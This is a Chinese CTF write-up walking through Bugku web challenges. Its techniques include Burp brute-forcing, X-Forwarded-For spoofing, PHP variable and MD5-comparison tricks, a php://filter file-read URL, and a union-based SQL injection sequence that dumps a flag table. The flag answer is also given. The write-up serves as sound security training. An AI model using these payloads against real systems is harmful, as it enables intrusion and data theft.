# web2

打开F12，看到注释中就存在flag。

![web2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/web2.png)

# 计算器

输入框中只允许输入一个数字，查看源码发现`maxlength=1`，改成大一点的数字就好了。

![计算器](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/随机数字运算.png)

# web基础$_GET

阅读网页上的代码知，考查的是get的性质

![web基础$_GET](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/web基础%24_GET.png)

# web基础$_POST

借助Postman工具进行POST请求

![web基础$_POST](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/web基础%24_POST.png)

# 矛盾

阅读代码可知，要发送一个get请求且num=1，直接输入1是不行的，通过了解is_numeric的性质知输入1x也可以转为1，得flag。

![矛盾](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%9F%9B%E7%9B%BE.png)

# web3

将源码中的注释部分直接放入html中，打开该html文件，即可看到flag。

![](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/web3.png)

# 域名解析

直接上图，修改本地hosts文件（最后一行添加上就可以）即可访问给出的地址

![域名解析](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90.png)

# 你必须让他停下

使用burpsuite进行抓包，第十张图片存在flag

![你必须让他停下](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B.png)

# 变量1

GLOBALS全局变量

```php
flag In the variable ! <?php  
error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
```

![变量1](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E5%8F%98%E9%87%8F1.png)

# web5

JavaScript代码组成的表达式

![web5](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/web5.png)

# 头等舱

使用burpsuite抓包，一抓就出来了。

![头等舱](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E5%A4%B4%E7%AD%89%E8%88%B1.png)

# 网站被黑

使用御剑进行扫描，发现一个后门网站

![网站被黑1](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91.png)

打开扫描出来的网站

![网站被黑2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%912.png)

使用burpsuite进行暴力破解

![网站被黑3](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%913.png)

# 管理员系统

> 参考 https://blog.csdn.net/xyx107/article/details/83017560 
>
> https://blog.csdn.net/Ruhe_king/article/details/82494834

在源码的注释中有 `dGVzdDEyMw==` 这一段，使用base64解码得到 `test123`，使用用户名 `admin`，密码 `test123`登录尝试得到下面的结果

![管理员系统2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F2.png)

提示中有**本地**，使用burpsuit抓包，修改XFF，【XFF：HTTP 请求头中的 X-Forwarded-For，用来表示 HTTP 请求端真实 IP】，抓包后，send to repeater，添加X-Forwarded-For：127.0.0.1，GO

![管理员系统](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F.png)

# web4

提示我们看看源代码，将eval改成console.log,得到了下面`checkSubmit`函数，此题得解。

![web4](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/web4.png)



# flag在index里

> 参考 https://blog.csdn.net/zpy1998zpy/article/details/80585443 

点击后发现网址变成了http://123.206.87.240:8005/post/index.php?file=show.php

这里我们看到了file关键字，于是我们就想到了php://filter，把网址改为 http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php，得到一段base64编码，解码得到flag

![flag在index里](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/flag%E5%9C%A8index%E9%87%8C.png)

# 输入密码查看flag

提示输入五位的数字，直接使用burpsuite进行暴力破解

![输入密码查看flag](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag.png)

# 点击一百万次

阅读其中的JavaScript部分代码，使用hackbar或者控制台，可以将clicks设置为大于100万的数字，即可得出flag

![点击一百万次](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%82%B9%E5%87%BB%E4%B8%80%E7%99%BE%E4%B8%87%E6%AC%A1.png)

![点击一百万次2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%82%B9%E5%87%BB%E4%B8%80%E7%99%BE%E4%B8%87%E6%AC%A12.png)

# 备份是个好习惯

> 参考 https://blog.csdn.net/wyj____/article/details/90694603 
>
> https://blog.csdn.net/EustiaSora/article/details/79149411

![备份是个好习惯](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF.png)

```php
<?php
/**
 * Created by PhpStorm.
 * User: Norse
 * Date: 2017/8/6
 * Time: 20:22
*/

include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```

得到上面的代码后，构造相应的get请求，得到flag

![备份是个好习惯2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF2.png)

# 成绩单

首先分别输入1,2,3，均有输出，输入1’，没有回应，因此可以判断存在sql注入

分别输入

```sql
1' order by 1#
1' order by 2#
1' order by 3#
1' order by 4#
```

均有回应，但是当我们使用 `1' order by 5#` 时，没有回应，可以根据此判断字段数为4。

然后联合查询，输入 `1' union select 1,2,3,4#`，没有显示有用的东西，因为 id=1 被覆盖，输入 

```sql
5' union select 1,2,3,database()#
```

即设置一个新的id，要select的值会显示在表上（覆盖）。

现在我们得到了一个数据库的名字 `skctf_flag`，之后就进行爆表

```sql
id=-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()# 
```

得到表名：fl4g,sc

接下来就要爆字段了

```sql
id=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#
```

得到字段skctf_flag

最后就是查询数据了，通过使用：

```sql
id=-1' union select 1,2,3,skctf_flag from fl4g#
```

得到flag：BUGKU{Sql_INJECT0N_4813drd8hz4}

